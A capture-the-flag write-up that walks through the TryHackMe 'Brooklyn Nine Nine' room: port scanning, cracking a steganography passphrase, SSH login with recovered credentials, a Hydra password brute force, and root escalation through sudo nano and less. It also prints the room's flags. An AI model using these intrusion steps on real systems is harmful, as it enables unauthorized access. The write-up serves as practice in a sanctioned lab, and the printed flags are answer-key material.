__📚 [TryHackMe Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)


## setup

1. [Install nmap](https://github.com/TurboLabIt/cybersec/blob/main/notes/nmap.md)


## recon

[nmap scan (zznmap)](https://github.com/TurboLabIt/cybersec/blob/main/notes/nmap.md)

````shell
$ zznmap 10.65.129.83

...
Discovered open port 21/tcp
Discovered open port 22/tcp
Discovered open port 80/tcp
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
...
````

- **21**: vsftpd 3.0.3
- **22**: OpenSSH 7.6p1 Ubuntu
- **80**: Apache httpd 2.4.29 ((Ubuntu))


The main application at http://10.65.129.83 shows a full-page image.

The source has this hint:

````html
<!-- Have you ever heard of steganography? -->
````

## de-steg the image

[notes/image-steganography.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/image-steganography.md)

````shell
$ stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
````

The extracted file contains this message:

> Holts Password:
> fluffydog12@ninenine
> Enjoy!!

note: [in the show, the name of the character is](https://en.wikipedia.org/wiki/Brooklyn_Nine-Nine)
*Captain Raymond **Holt***. So the message should be "Holt's Password" --> the username is likely `holt`.


## ssh access

````shell
$ ssh holt@10.65.129.83

holt@brookly_nine_nine:~$ ls -la
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt

holt@brookly_nine_nine:~$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
````

The first flag is: `ee11cbb19052e40b07aac0ca060c23ee`


The other interesting file is not readable:

````shell
$ cat nano.save 

cat: nano.save: Permission denied
````

## escalate

Let's see if the user can sudo:

````shell
$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
````

Close enough, we can nano.


````shell
$ sudo nano nano.save

^[c^[]104^G^[[!p^[[?3;4l^[[4l^[>
bash: line 1:  8199 Hangup                  sh 1>&0 2>&0
bash: /bin: Is a directory
````

That's a hint to use [notes/sudo-nano-gtfobin-exploit.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/sudo-nano-gtfobin-exploit.md) and escalate to root.

After that:

````shell
$ whoami
root


$ ls -la /root

-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 May 17  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 18  2020 .ssh
-rw-r--r--  1 root root  165 May 17  2020 .wget-hsts
-rw-r--r--  1 root root  135 May 18  2020 root.txt


$ cat /root/root.txt

-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
````

The second flag is: `63a9f0ea7bb98050796b649e85481845`


## FTP check

The room is solved, but we haven't tried the FTP instance yet.


````shell
$ ftp holt@10.65.129.83

220 (vsFTPd 3.0.3)
530 This FTP server is anonymous only.
ftp: Login failed


$ ftp anonymous@10.65.129.83

Connected to 10.65.129.83.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: <none>

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls

229 Entering Extended Passive Mode (|||58222|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.

ftp> get note_to_jake.txt
226 Transfer complete.
````

The note is:

> From Amy,
> Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

There is an "amy" account on the server. She cannot sudo. Her home is readable, but there isn't anything relevant.

There is a passphrase-protected .ssh/id_rsa (accessible only as root), but it doesn't look relevant.

But! From the message we discover that `jake` password is weak. Let's try to Hydra the SSH:

````shell
$ hydra -l jake -P /usr/share/wordlists/rockyou.txt -u -e snr   10.65.129.83 ssh

[22][ssh] host: 10.65.129.83   login: jake   password: 987654321


$ ssh jake@10.65.129.83
jake@brookly_nine_nine:~$ sudo -l
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
````

This user can do `sudo less`, not `sudo nano` --> escalate with [notes/sudo-less-gtfobin-exploit.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/sudo-less-gtfobin-exploit.md).
